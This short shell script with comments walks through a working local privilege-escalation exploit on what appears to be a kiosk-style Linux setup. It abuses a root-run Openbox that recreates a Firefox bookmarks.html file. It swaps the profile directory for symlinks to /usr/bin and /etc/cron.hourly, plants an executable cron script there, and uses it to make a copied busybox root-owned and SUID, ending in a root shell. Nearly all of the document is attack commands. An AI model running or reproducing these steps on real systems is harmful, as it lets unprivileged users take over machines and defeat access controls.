#-openbox is running as root
openbox --replace

#/home/guest/.mozilla/firefox/c3pp43bg.default/bookmarks.html is recreated each time the graphic restarts 

mv /home/guest/.mozilla/firefox/c3pp43bg.default /home/guest/.mozilla/firefox/old_prof

ln -s /usr/bin /home/guest/.mozilla/firefox/c3pp43bg.default

openbox --replace

#At this stage bookmarks.html is created at /usr/bin/bookmarks.html

echo "#!/bin/bash" > /usr/bin/bookmarks.html
echo "gtkdialog -f /home/guest/terminal.txt" >> /usr/bin/bookmarks.html

#NB: Script .sh at /etc/profile.d/ run everytime user logs in
#We will exploit /etc/cron.hourly which contains script run every hour

rm /home/guest/.mozilla/firefox/c3pp43bg.default
ln -s /etc/cron.hourly /home/guest/.mozilla/firefox/c3pp43bg.default

cp /bin/busybox /home/guest

openbox --replace

echo "#!/bin/bash" > /etc/cron.hourly/bookmarks.html
echo "chown root:root /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
echo "chmod +s /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html

chmod +x /etc/cron.hourly/bookmarks.html

#After making our bookmarks.html script executable, it will execute at the top of the next hour, 
#making our copy of busybox root-owned and SUID:

echo "#!/bin/bash" > runterminal.sh
echo "/usr/bin/gtkdialog -f /home/guest/terminal.txt" >> runterminal.sh

/home/guest/busybox sh /home/guest/runterminal.sh